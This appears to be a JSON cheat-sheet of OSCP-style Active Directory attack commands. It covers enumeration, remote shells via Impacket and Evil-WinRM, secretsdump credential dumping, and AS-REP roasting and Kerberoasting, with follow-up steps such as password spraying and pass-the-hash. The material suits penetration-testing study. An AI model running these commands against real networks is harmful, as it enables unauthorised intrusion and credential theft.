{
  "commands": [
    {
      "id": "bloodhound-ingest",
      "name": "BloodHound - Ingest Data",
      "description": "Import SharpHound data to BloodHound",
      "command": "# Import via BloodHound GUI: Upload Data button",
      "category": "active-directory",
      "subcategory": "enumeration",
      "tags": [
        "oscp",
        "bloodhound",
        "active-directory",
        "gui"
      ],
      "prerequisites": [
        "SharpHound.zip collected",
        "Neo4j running",
        "BloodHound running"
      ],
      "next_steps": [
        "Run pre-built queries",
        "Find attack paths"
      ]
    },
    {
      "id": "bloodhound-query",
      "name": "BloodHound - Query Paths",
      "description": "Query attack paths in BloodHound",
      "command": "# Run query: 'Shortest Paths to Domain Admins'",
      "category": "active-directory",
      "subcategory": "enumeration",
      "tags": [
        "oscp",
        "bloodhound",
        "active-directory",
        "analysis"
      ],
      "next_steps": [
        "Follow path steps",
        "Test exploits"
      ]
    },
    {
      "id": "cme-smb-shares",
      "name": "CrackMapExec - Enumerate Shares",
      "description": "Enumerate SMB shares with credentials",
      "command": "crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP/range",
          "example": "192.168.1.0/24",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "user",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "crackmapexec",
        "smb",
        "active-directory",
        "shares"
      ],
      "next_steps": [
        "Mount interesting shares",
        "Download sensitive files"
      ],
      "flag_explanations": {
        "--shares": "Enumerate shares",
        "--disks": "Enumerate disks"
      }
    },
    {
      "id": "cme-smb-users",
      "name": "CrackMapExec - Enumerate Users",
      "description": "Enumerate domain users via SMB",
      "command": "crackmapexec smb <TARGET> -u <USER> -p <PASS> --users",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target DC IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "user",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "crackmapexec",
        "active-directory",
        "enumeration"
      ],
      "next_steps": [
        "Build user list",
        "Password spray"
      ],
      "flag_explanations": {
        "--users": "Enumerate domain users",
        "--groups": "Enumerate domain groups"
      }
    },
    {
      "id": "psexec-shell",
      "name": "Impacket PSExec - Remote Shell",
      "description": "Execute commands remotely via PSExec",
      "command": "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or NTLM hash",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "psexec",
        "active-directory",
        "lateral-movement"
      ],
      "prerequisites": [],
      "next_steps": [
        "Execute commands as SYSTEM"
      ]
    },
    {
      "id": "smbexec-shell",
      "name": "Impacket SMBExec - Remote Shell",
      "description": "Execute commands via SMB (fileless)",
      "command": "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "smbexec",
        "active-directory",
        "lateral-movement"
      ],
      "alternatives": [
        "psexec-shell",
        "wmiexec-shell"
      ],
      "next_steps": [
        "Execute commands"
      ]
    },
    {
      "id": "wmiexec-shell",
      "name": "Impacket WMIExec - Remote Shell",
      "description": "Execute commands via WMI (semi-interactive)",
      "command": "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "wmiexec",
        "active-directory",
        "lateral-movement"
      ],
      "next_steps": [
        "Execute commands"
      ]
    },
    {
      "id": "secretsdump-hashes",
      "name": "Impacket SecretsDump - Dump Hashes",
      "description": "Dump SAM/LSA/NTDS secrets from Windows",
      "command": "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "credential-dumping",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Admin username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target DC IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "secretsdump",
        "active-directory",
        "credentials"
      ],
      "prerequisites": [],
      "next_steps": [
        "Crack hashes",
        "Pass-the-hash attacks"
      ],
      "flag_explanations": {
        "-just-dc": "Extract NTDS.dit only",
        "-just-dc-ntlm": "Extract NTLM hashes only"
      }
    },
    {
      "id": "getnpusers-asreproast",
      "name": "Impacket GetNPUsers - AS-REP Roasting",
      "description": "Extract AS-REP hashes for users without Kerberos pre-auth",
      "command": "impacket-GetNPUsers <DOMAIN>/ -usersfile <USERLIST> -dc-ip <DC_IP>",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USERLIST>",
          "description": "File with usernames",
          "example": "users.txt",
          "required": true
        },
        {
          "name": "<DC_IP>",
          "description": "Domain controller IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "as-rep-roasting",
        "kerberos",
        "active-directory"
      ],
      "next_steps": [
        "Crack AS-REP hashes with hashcat/john"
      ],
      "flag_explanations": {
        "-dc-ip": "Domain controller IP",
        "-usersfile": "File containing usernames",
        "-request": "Request TGT for users"
      }
    },
    {
      "id": "getuserspns-kerberoast",
      "name": "Impacket GetUserSPNs - Kerberoasting",
      "description": "Request service tickets for Kerberoastable accounts",
      "command": "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain user",
          "example": "user",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<DC_IP>",
          "description": "Domain controller IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "kerberoasting",
        "kerberos",
        "active-directory"
      ],
      "prerequisites": [],
      "next_steps": [
        "Crack TGS hashes with hashcat mode 13100"
      ],
      "flag_explanations": {
        "-request": "Request TGS tickets",
        "-dc-ip": "Domain controller IP",
        "-outputfile": "Save hashes to file"
      }
    },
    {
      "id": "evil-winrm-shell",
      "name": "Evil-WinRM - PowerShell Remoting",
      "description": "Connect to Windows via WinRM for PowerShell access",
      "command": "evil-winrm -i <TARGET> -u <USER> -p <PASS>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "evil-winrm",
        "winrm",
        "active-directory",
        "powershell"
      ],
      "prerequisites": [
        "WinRM enabled on target"
      ],
      "next_steps": [
        "Upload files",
        "Execute PowerShell commands"
      ],
      "flag_explanations": {
        "-i": "Target IP",
        "-u": "Username",
        "-p": "Password",
        "-H": "NTLM hash (pass-the-hash)"
      }
    },
    {
      "id": "rpcclient-enum",
      "name": "RPCClient - Enumerate SMB",
      "description": "Enumerate SMB/MSRPC information",
      "command": "rpcclient -U '<USER>%<PASS>' <TARGET>",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username (or empty for null session)",
          "example": "",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password (or empty for null session)",
          "example": "",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "rpcclient",
        "smb",
        "enumeration",
        "active-directory"
      ],
      "next_steps": [
        "enumdomusers (list users)",
        "enumdomgroups (list groups)",
        "queryuser <RID>"
      ]
    },
    {
      "id": "smbclient-connect",
      "name": "SMBClient - Connect to Share",
      "description": "Connect to SMB share and browse files",
      "command": "smbclient //<TARGET>/<SHARE> -U <USER>",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "Share name",
          "example": "C$",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "smbclient",
        "smb",
        "active-directory",
        "shares"
      ],
      "next_steps": [
        "ls (list files)",
        "get <FILE> (download)",
        "put <FILE> (upload)"
      ],
      "flag_explanations": {
        "-U": "Username",
        "-N": "No password (null session)",
        "-L": "List shares"
      }
    },
    {
      "id": "smbmap-shares",
      "name": "SMBMap - Enumerate Shares",
      "description": "Enumerate SMB shares and permissions",
      "command": "smbmap -H <TARGET> -u <USER> -p <PASS>",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "guest",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "smbmap",
        "smb",
        "active-directory",
        "shares"
      ],
      "next_steps": [
        "Access writable shares",
        "Download sensitive files"
      ],
      "flag_explanations": {
        "-H": "Target host",
        "-u": "Username",
        "-p": "Password",
        "-R": "Recursively list shares"
      }
    },
    {
      "id": "ldapsearch-ad",
      "name": "LDAP Search - AD Enumeration",
      "description": "Query Active Directory via LDAP",
      "command": "ldapsearch -x -H ldap://<TARGET> -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' '(objectClass=user)'",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "DC IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "user",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<BASE_DN>",
          "description": "Base DN",
          "example": "DC=domain,DC=local",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "ldapsearch",
        "ldap",
        "active-directory",
        "enumeration"
      ],
      "next_steps": [
        "Extract users",
        "Find service accounts",
        "Check descriptions for passwords"
      ]
    },
    {
      "id": "rubeus-asreproast",
      "name": "Rubeus - AS-REP Roasting",
      "description": "Perform AS-REP roasting on Windows",
      "command": "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "tags": [
        "oscp",
        "rubeus",
        "as-rep-roasting",
        "kerberos",
        "active-directory",
        "windows"
      ],
      "prerequisites": [
        "Rubeus.exe on target"
      ],
      "next_steps": [
        "Transfer hashes to attacker",
        "Crack with hashcat"
      ],
      "flag_explanations": {
        "/format:hashcat": "Output format for hashcat",
        "/outfile": "Output file for hashes",
        "/user:<USER>": "Target specific user"
      }
    },
    {
      "id": "rubeus-kerberoast",
      "name": "Rubeus - Kerberoasting",
      "description": "Perform Kerberoasting on Windows",
      "command": "Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "tags": [
        "oscp",
        "rubeus",
        "kerberoasting",
        "kerberos",
        "active-directory",
        "windows"
      ],
      "prerequisites": [
        "Rubeus.exe on target"
      ],
      "next_steps": [
        "Crack TGS hashes with hashcat mode 13100"
      ],
      "flag_explanations": {
        "/format:hashcat": "Output format for hashcat",
        "/outfile": "Output file for hashes",
        "/user:<USER>": "Target specific SPN account"
      }
    }
  ]
}
